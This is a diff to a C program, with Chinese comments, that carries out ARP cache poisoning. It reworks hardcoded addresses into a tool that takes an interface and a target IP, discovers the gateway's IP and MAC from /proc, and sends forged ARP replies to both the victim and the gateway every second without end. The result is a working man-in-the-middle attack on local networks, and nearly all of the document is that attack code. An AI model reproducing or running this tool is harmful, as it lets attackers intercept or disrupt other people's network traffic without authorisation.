@@ -33,75 +33,70 @@
 int sock;	
 struct sockaddr_ll sa;
 struct ifreq req;
-const uint8_t myMac[6]      = {0x18,0x03,0x73,0x54,0xd8,0x0a};
-const uint8_t attackMac[6]  = {0xac,0x72,0x89,0x3b,0x53,0x49};
-//const uint8_t myMac[6]      = {0xc0,0xf8,0xda,0x5c,0xc0,0xfd};
-const uint8_t gatewayMac[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
-const uint8_t mac[6]        = {0x00,0x21,0x27,0x6a,0x27,0x24};
-const uint8_t attackIp[4]   = {192,168,0,128};
-const uint8_t myIp[4]       = {192,168,0,137};
-const uint8_t gatewayIp[4]  = {192,168,0,1};
-bool flag[256];
-void showMac(uint8_t *s, uint8_t *d)
+uint8_t myMac[6]      = {0};
+uint8_t attackMac[6]  = {0};
+uint8_t gatewayMac[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+uint8_t mac[6]        = {0};
+uint8_t attackIp[4]   = {0};
+uint8_t myIp[4]       = {0};
+uint8_t gatewayIp[4]  = {0};
+uint8_t netIfName[16] = "eth0";
+void displayIp(uint8_t *s)
 {
-	if(s == NULL || d == NULL)
-	{
-		perror("MAC IS NULL");
-		exit(1);
-	}
-	printf("%02x:%02x:%02x:%02x:%02x:%02x -> %02x:%02x:%02x:%02x:%02x:%02x\n",s[0],s[1],s[2],s[3],s[4],s[5],d[0],d[1],d[2],d[3],d[4],d[5]);
+	printf("%d.%d.%d.%d\n", s[0], s[1], s[2], s[3]);
 }
-void showIp(uint8_t *s, uint8_t *d)
+void displayMac(uint8_t *s)
 {
-	if(s == NULL || d == NULL)
-	{
-		perror("IP IS NULL");
-		exit(1);
-	}
-	printf("%d.%d.%d.%d -> %d.%d.%d.%d\n",s[0],s[1],s[2],s[3],d[0],d[1],d[2],d[3]);
+	printf("%02x:%02x:%02x:%02x:%02x:%02x\n", s[0], s[1], s[2], s[3], s[4], s[5]);
 }
-bool checkMyMac(uint8_t *s)
+int init(int argc, char* argv[])
 {
-	if(s == NULL)
+	int opt;
+	bool flag = false;
+	while((opt = getopt(argc, argv, "i:t:")) != -1)
 	{
-		perror("MAC IS NULL");
-		exit(1);
-	}
-	bool flag = true;
-	for(int i=0;i<6;i++)
-	{
-		if(s[i] != myMac[i])
+		switch(opt)
 		{
-			flag = false;
-			break;
+			case 'i':
+			{
+				int ilen = strlen(optarg);
+				memcpy(netIfName, optarg, sizeof(char)*ilen);
+			}
+				break;
+			case 't':
+			{
+				uint32_t tip = inet_addr(optarg);
+				if(tip != -1)
+				{
+					flag = true;
+					memcpy(attackIp, &tip, sizeof(int));
+				}
+				else
+				{
+					perror("target ip");
+					exit(1);
+				}
+			}
+				break;
+			default:
+				perror("opt");
+				break;
 		}
 	}
-	return flag;
-}
-void *send(void *arg)
-{
-	if(arg != NULL)
-	{
-		ARPPACKET arp;
-		memcpy(&arp, arg, sizeof(arp));
-		int i = 0;
-		while(1)
-		{
-			printf("第 %d 次发送应答包\n", ++i);
-			sendto(sock, &arp, sizeof(arp), 0, (struct sockaddr*)&sa, sizeof(sa));
-			sleep(1);
-		}
-	}
+	if(flag == false) exit(-1);
+	return 0;
 }
 void sendchy()
 {
-	ARPPACKET arp;
+	ARPPACKET arp, garp;
+	//构造攻击者到被攻击者的ARP应答包
 	arp.ethhdr.type = htons(ETH_P_ARP);
 	arp.arphdr.ht =  htons(ARPHRD_ETHER);
 	arp.arphdr.pt =  htons(ETH_P_IP);
     memcpy(arp.ethhdr.dst, attackMac, 6);
     memcpy(arp.ethhdr.src, myMac, 6);
-	//memcpy(arp.ethhdr.dst, gatewayMac, 6);
+	arp.arphdr.ht = htons(1);
+	arp.arphdr.pt = htons(2048);
 	arp.arphdr.hl = 6;
 	arp.arphdr.pl = 4;
 	arp.arphdr.op = htons(ARPOP_REPLY);
@@ -109,107 +104,147 @@ void sendchy()
 	memcpy(arp.arphdr.t_eth, attackMac, 6);
 	memcpy(arp.arphdr.s_ip, gatewayIp, 4);
 	memcpy(arp.arphdr.t_ip, attackIp, 4);
+	memcpy(&garp, &arp, sizeof(arp));
+	//构造攻击者到网关的ARP应答包
+	memcpy(garp.ethhdr.dst, mac, 6);
+	memcpy(garp.arphdr.t_eth, mac, 6);
+	memcpy(garp.arphdr.s_ip, attackIp, 4);
+	memcpy(garp.arphdr.t_ip, gatewayIp, 4);
 	int i = 0;
 	while(1)
 	{
-		printf("第 %d 次发送应答包 --> 192.168.0.%d\n", ++i, attackIp[3]);
+		printf("第 %d 次发送应答包 --> ", ++i);
+		displayIp(attackIp);
 		sendto(sock, &arp, sizeof(arp), 0, (struct sockaddr*)&sa, sizeof(sa));
+		sendto(sock, &garp, sizeof(garp), 0, (struct sockaddr*)&sa, sizeof(sa));
 		sleep(1);
 	}
 }
-void sendArp(ARPPACKET	*oarp,const uint8_t *s,const uint8_t *t)
+void getLocalIp()
 {
-	ARPPACKET arp;
-	memcpy(&arp, oarp, sizeof(arp));
-//	arp.ethhdr.type = htons(ETH_P_ARP);
-//	arp.arphdr.ht =  htons(ARPHRD_ETHER);
-//	arp.arphdr.pt =  htons(ETH_P_IP);
-	memcpy(arp.ethhdr.dst, oarp->ethhdr.src, 6);
-	memcpy(arp.ethhdr.src, myMac, 6);
-//	memcpy((void*)arp.ethhdr.dst, (void*)gatewayMac, 6);
-//	arp.arphdr.hl = 6;
-//	arp.arphdr.pl = 4;
-	arp.arphdr.op = htons(ARPOP_REPLY);
-	memcpy(arp.arphdr.s_eth, myMac, 6);
-	memcpy(arp.arphdr.t_eth, oarp->arphdr.s_eth, 6);
-	memcpy(arp.arphdr.s_ip, s, 4);
-	memcpy(arp.arphdr.t_ip, t, 4);
-	pthread_t pt;
-	if(!pthread_create(&pt, NULL, send,(void *)&arp))
+	if(ioctl(sock, SIOCGIFADDR, &req) != 0)
 	{
-		perror("pthread_create");
+		perror("Get local IP address");
+		exit(1);
 	}
-	//if(sendto(sock, &arp, sizeof(arp), 0, (struct sockaddr*)&sa, sizeof(sa)) < 0)
-	//{
-	//	perror("sendto");
-	//	exit(1);
-	//}
+	in_addr ip;
+	ip = ((struct sockaddr_in *)&req.ifr_addr)->sin_addr;
+	memcpy(myIp, &ip, sizeof(in_addr));
+	printf("Local IP Address: ");
+	displayIp(myIp);
 }
-void sendReqArp(ARPPACKET *oarp)
+void getLocalMac()
 {
-	ARPPACKET arp;
-	memcpy(&arp, oarp, sizeof(arp));
-	memcpy(arp.ethhdr.src, myMac, 6);
-	memcpy(arp.ethhdr.dst, gatewayMac, 6);
-	memcpy(arp.arphdr.s_eth, myMac, 6);
-	memcpy(arp.arphdr.s_ip, myIp, 4);
-	memcpy(arp.arphdr.t_eth, gatewayMac, 6);
-	memcpy(arp.arphdr.t_ip, attackIp, 4);
-	if(sendto(sock, &arp, sizeof(arp), 0, (struct sockaddr*)&sa, sizeof(sa)) < 0)
+	if(ioctl(sock, SIOCGIFHWADDR, &req) != 0)
 	{
-		perror("sendto");
+		perror("Get local Mac address");
+		exit(1);
 	}
+	memcpy(myMac, req.ifr_hwaddr.sa_data, 6);
+	printf("Local Mac Address: ");
+	displayMac(myMac);
 }
-void recvArp()
+int ctoi(char c)
 {
-	char buffer[4096];
-	while(1)
+	if(c >= 'A' && c <= 'Z') return c - 'A' + 10;
+	if(c >= 'a' && c <= 'z') return c - 'a' + 10;
+	return c - '0';
+}
+void getGatewayMac()
+{
+	FILE *p = fopen("/proc/net/arp", "r");
+	if(p == NULL)
 	{
-		int n_read = recvfrom(sock, buffer, 4096, 0, NULL, NULL);
-		if(n_read < 42)
-		{
-			perror("recvfrom");
-			continue;
-		}
-		ARPPACKET *arp = (ARPPACKET*)buffer;
-		printf("--------------------------------\n");
-		showMac(arp->ethhdr.src, arp->ethhdr.dst);
-		showMac(arp->arphdr.s_eth, arp->arphdr.t_eth);
-		showIp(arp->arphdr.s_ip, arp->arphdr.t_ip);
-		int op = ntohs(arp->arphdr.op);
-		printf("%s\n", op == 1 ? "arp request" : "arp reply");
-		if(op == 2 && arp->arphdr.s_ip[3] == attackIp[3] && arp->arphdr.t_ip[3] == myIp[3] && flag[arp->arphdr.s_ip[3]] == 0)
-		{
-			flag[arp->arphdr.s_ip[3]] = 1;
-			printf("ARP REPLY\n");
-			sendArp(arp, gatewayIp, attackIp);
-		}
-		else if(op == 1 && arp->arphdr.s_ip[3] == gatewayIp[3] && arp->arphdr.t_ip[3] == attackIp[3] && flag[arp->arphdr.s_ip[3]] == 0)
-		{
-			flag[arp->arphdr.s_ip[3]] = 1;
-			printf("ARP REPLY\n");
-			sendArp(arp, attackIp, gatewayIp);
-		}
-		else if((op == 1 && arp->arphdr.s_ip[3] == gatewayIp[3]) || (op == 1 && arp->arphdr.s_ip[3] == attackIp[3] && arp->arphdr.t_ip[3] == gatewayIp[3]))
-		{
-			printf("ARP REQUEST\n");
-			sendReqArp(arp);
-		}
-		printf("--------------------------------\n");
-		sleep(3);
+		perror("Open arp file");
+		exit(1);
 	}
+	char Title[100];
+	fgets(Title, 100, p);
+	char ip[16], HW[8], Flags[8], Mac[18], Mask[5], Dev[16], g_ip[16], a_ip[16];
+	sprintf(g_ip, "%d.%d.%d.%d", gatewayIp[0], gatewayIp[1], gatewayIp[2], gatewayIp[3]);
+	sprintf(a_ip, "%d.%d.%d.%d", attackIp[0], attackIp[1], attackIp[2], attackIp[3]);
+	bool gf=false, af=false;
+	while(!feof(p))
+	{
+		fscanf(p, "%s %s %s %s %s %s", ip, HW, Flags, Mac, Mask, Dev);
+		if(strcmp(ip, g_ip) == 0 && strcmp(Flags, "0x2") == 0)
+		{
+			gf = true;
+			for(int i = 0; i < 6; ++ i)
+			{
+				mac[i] = ctoi(*(Mac + 3*i))*16 + ctoi(*(Mac + 3*i +1));
+			}
+		}
+		else if(strcmp(ip, a_ip) == 0 && strcmp(Flags, "0x2") == 0)
+		{
+			af = true;
+			for(int i = 0; i < 6; ++ i)
+			{
+				attackMac[i] = ctoi(*(Mac + 3*i))*16 + ctoi(*(Mac + 3*i +1));
+			}
+		}
+		if(gf && af) break;
+	}
+	fclose(p);
+	printf("Gateway Mac Address: ");
+	displayMac(mac);
+	printf("Attack Mac Address: ");
+	displayMac(attackMac);
 }
-int main()
+void getGatewayIp()
 {
+	FILE *p = fopen("/proc/net/route", "r");
+	if(p == NULL)
+	{
+		perror("Open file");
+		exit(1);
+	}
+	char Title[100];
+	fgets(Title, 100, p);
+	char iface[5];
+	char Dst[8];
+	char Gateway[9], ip[9], gip[16];
+	char Flags[4];
+	char RefCnt[5];
+	char Use[5];
+	char Metric[5];
+	char Mask[10];
+	char MTU[5];
+	char RTT[5];
+	memset(ip, '0', sizeof(ip));
+	while(!feof(p))
+	{
+		fscanf(p, "%s %s %s %s %s %s %s %s %s %s", iface, Dst, Gateway, Flags, RefCnt, Use, Metric, Mask, MTU, RTT);
+		if(strcmp(Gateway, ip) != 0)
+		{
+			//printf("%s\n", Gateway);
+			break;
+		}
+	}
+	fclose(p);
+	for(int i = 0; i < 4; ++ i)
+	{
+		gatewayIp[3-i] = ctoi(*(Gateway + 2*i))*16 + ctoi(*(Gateway + 2*i +1));
+	}
+	printf("Gateway IP Address: ");
+	displayIp(gatewayIp);
+	getGatewayMac();
+}
+int main(int argc, char* argv[])
+{
+	if(init(argc, argv) != 0)
+	{
+		perror("target error");
+		exit(-1);
+	}
 	if((sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0)
 	{
 		perror("socket");
 		exit(1);
 	}
 	memset(&sa, 0, sizeof(sa));
-	memset(flag, 0, sizeof(flag));
 	sa.sll_family = AF_PACKET;
-	strcpy(req.ifr_name, "eth0");
+	strcpy(req.ifr_name, (char*)netIfName);
 	if(ioctl(sock, SIOCGIFINDEX, &req) != 0)
 	{
 		perror("ioctl");
@@ -218,6 +253,9 @@ int main()
 	}
 	sa.sll_ifindex = req.ifr_ifindex;
 	sa.sll_protocol = htons(ETH_P_ARP);
+	getLocalIp();
+	getLocalMac();
+	getGatewayIp();
 	if(ioctl(sock, SIOCGIFFLAGS, &req) != 0)
 	{
 		perror("ioctl");
@@ -230,8 +268,7 @@ int main()
 		close(sock);
 		exit(1);
 	}
-	recvArp();
-	//sendchy();
+	sendchy();
 	close(sock);
 	return 1;
 }
